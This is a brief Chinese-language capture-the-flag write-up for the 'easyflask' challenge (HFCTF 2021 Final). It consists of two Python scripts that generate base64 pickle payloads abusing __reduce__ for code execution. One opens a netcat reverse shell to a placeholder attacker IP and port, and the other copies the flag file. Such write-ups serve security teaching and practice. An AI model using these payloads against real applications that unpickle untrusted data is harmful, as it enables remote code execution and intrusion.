# [HFCTF 2021 Final]easyflask

## 知识点

`pickle __reduce__`

## 解题

```python
import pickle
from base64 import b64encode

User = type('User', (object,), {
    'uname': 'test',
    'is_admin': 1,
    '__repr__': lambda o: o.uname,
    '__reduce__': lambda o: (eval, ("__import__('os').system('nc IP PORT -e /bin/sh')",))

})

u = pickle.dumps(User())
print(b64encode(u).decode())
```

或者

```python
import pickle
from base64 import b64encode

class User(object):
    def __reduce__(self):
        import os
        cmd = "cat /flag > /tmp/test1"
        return (os.system, (cmd,))


u = pickle.dumps(User())
print(b64encode(u).decode())
```

